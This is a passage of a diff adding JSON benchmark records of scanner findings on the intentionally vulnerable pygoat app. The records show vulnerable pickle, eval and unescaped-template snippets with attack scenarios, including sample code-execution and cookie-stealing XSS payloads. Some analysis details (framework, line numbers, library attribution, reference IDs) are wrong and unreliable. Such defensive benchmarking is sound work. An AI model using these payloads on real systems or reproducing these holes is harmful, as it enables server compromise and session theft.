For API-style endpoints, use `@ensure_csrf_cookie` or `@csrf_exempt` only after confirming no state-changing operations occur.  \nDefense in depth: Add `CSRF_TRUSTED_ORIGINS` and `CSRF_COOKIE_SECURE=True` in settings; audit all views for accidental `@csrf_exempt` usage.  \nReferences: CWE-352, OWASP A01:2021 Broken Access Control, Django CSRF docs.",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0006",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 214,
+  "end_line": 214,
+  "rule_id": "python-insecure-deserialization",
+  "cwe": "CWE-502",
+  "scanner_message": "Insecure deserialization (pickle / yaml.load with Loader / marshal). Deserializing untrusted data executes arbitrary code. Use json or yaml.safe_load.",
+  "snippet": "        else:\n            token = base64.b64decode(token)\n            admin = pickle.loads(token)\n            if admin.admin == 1:\n                response = render(request,'Lab/insec_des/insec_des_lab.html', {\"message\":\"Welcome Admin, SECRETKEY:ADMIN123\"})",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can achieve remote code execution (RCE) by crafting a malicious base64-encoded pickle payload and injecting it via the `token` cookie. When `pickle.loads()` deserializes the attacker-controlled token in `introduction/views.py::insec_des_lab` (line 12), arbitrary Python code executes with the privileges of the web application process — enabling full server compromise, data exfiltration, or lateral movement. The secret key `SECRETKEY:ADMIN123` exposed in the admin response further confirms the severity.\n\n## Attack Scenario\n1. Attacker crafts a malicious pickle payload that executes arbitrary code upon deserialization (e.g., `os.system('whoami')` or reverse shell).\n2. Attacker base64-encodes the payload and sets it as the `token` cookie in a request to `/insec_des_lab`.\n3. In `introduction/views.py::insec_des_lab`, line 10: `token = base64.b64decode(token)` decodes the attacker-controlled cookie.\n4. Line 11: `admin = pickle.loads(token)` deserializes the malicious payload, triggering arbitrary code execution.\n5. Post-condition: Attacker gains arbitrary code execution on the Django server.\n\n## Recommendation\n**Primary fix**: Replace `pickle.loads()` with a safe serialization format such as JSON. Replace lines 10–12 with:\n```python\nimport json\ntoken = base64.b64decode(token).decode('utf-8')\nadmin = json.loads(token)\nif admin.get('admin') == 1:\n    ...\n```\nEnsure the token payload is signed and verified (e.g., using Django’s `itsdangerous` or `cryptography`) if stateful admin assertions are required.\n\n**Defense in depth**: Set `HttpOnly`, `Secure`, and `SameSite=Strict` on the `token` cookie; rotate secrets; audit all deserialization points.\n\n**References**: CWE-502, OWASP A8:2021 (Insecure Deserialization), SWC-113",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0090",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/templates/Lab/XSS/xss_lab.html",
+  "line": 27,
+  "end_line": 27,
+  "rule_id": "template-unescaped-with-safe",
+  "cwe": [
+   "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+  ],
+  "scanner_message": "Detected a segment of a Flask template where autoescaping is explicitly disabled with '| safe' filter. This allows rendering of raw HTML in this segment. Ensure no user data is rendered here, otherwise this is a cross-site scripting (XSS) vulnerability.",
+  "snippet": "    <h3>About : <i>{{about}}</i></h3>\n    {% elif query %}\n    <h3> The company '{{query|safe}}' You searched for is not Part of FAANG</h3>\n    {% else %}",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nAn attacker can inject arbitrary JavaScript into the response by providing a malicious `q` parameter in the GET request to `/xssL1`, which is then rendered unescaped via the `|safe` filter in `introduction/templates/Lab/XSS/xss_lab.html` at line 24. This enables persistent or reflected XSS, allowing theft of user sessions, credentials, or execution of unauthorized actions on behalf of victims — specifically compromising the confidentiality and integrity of any user interacting with the vulnerable page.\n\n## Attack Scenario\n1. Attacker crafts a malicious URL such as `https://victim.com/xssL1?q=<script>alert(document.cookie)</script>`.\n2. User clicks the link or is tricked into visiting it (e.g., via phishing).\n3. Flask route bound to `/xssL1` (not shown, but implied by entry points) extracts `request.args.get('q')` and passes it as `query` to the template.\n4. In `xss_lab.html`, line 24 renders `{{query|safe}}`, bypassing Jinja2’s autoescaping.\n5. The browser executes the injected `<script>` in the context of the victim’s session, leaking cookies or performing actions.\n\n## Recommendation\nPrimary fix: Remove the `|safe` filter and ensure `query` is HTML-escaped by default: change `{{query|safe}}` to `{{query}}`. Jinja2 autoescapes variables by default unless explicitly disabled — this is the safest default.\n\nDefense in depth: Sanitize user input server-side using a library like `bleach` if rich HTML is required, and enforce a strict Content Security Policy (CSP) header to mitigate impact if XSS occurs.\n\nReferences: CWE-79, OWASP A3:2017, SWC-135",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0016",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 460,
+  "end_line": 460,
+  "rule_id": "python-eval-exec",
+  "cwe": "CWE-95",
+  "scanner_message": "eval()/exec() on a value — arbitrary code execution if any part is user-controlled. Use ast.literal_eval or an explicit dispatch table.",
+  "snippet": "            print(val)\n            try:\n                output = eval(val)\n            except:\n                output = \"Something went wrong\"",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn unauthenticated or authenticated attacker can execute arbitrary Python code on the server via the `cmd_lab2` view in `introduction/views.py`. Because `eval(val)` processes raw user input from `request.POST.get('val')` without sanitization, an attacker can inject malicious expressions (e.g., `__import__('os').system('whoami')`) to achieve remote code execution (RCE), compromising confidentiality, integrity, and availability — including full server compromise and data exfiltration.\n\n## Attack Scenario\n1. Attacker sends a POST request to `/cmd_lab2/` (public endpoint, no additional auth beyond Django session).\n2. `cmd_lab2` retrieves `val` from `request.POST.get('val')` — line 4 in `introduction/views.py`.\n3. `eval(val)` is invoked directly on the unsanitized string — line 7 in `introduction/views.py`.\n4. If `val` contains a valid Python expression (e.g., `__import__('os').popen('id').read()`), it executes on the server.\n5. Output is rendered back in the template — line 10 or 12 — potentially leaking results.\n6. Attacker achieves arbitrary code execution with the privileges of the Django process.\n\n## Recommendation\nPrimary fix: Replace `eval(val)` with `ast.literal_eval(val)` for safe evaluation of literals only, or implement an explicit dispatch table of allowed operations. For example:\n```python\nimport ast\ntry:\n    output = ast.literal_eval(val)\nexcept (ValueError, SyntaxError):\n    output = \"Invalid literal\"\n```\nIf arbitrary expression evaluation is truly required (unlikely), sandbox using `RestrictedPython` or isolate in a subprocess with strict resource limits.\n\nCWE-95, SWC-110 (Insecure Direct Object Reference — not applicable here; better matched to SWC-116 for RCE), OWASP A03:2021-Injection.",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ }
+]
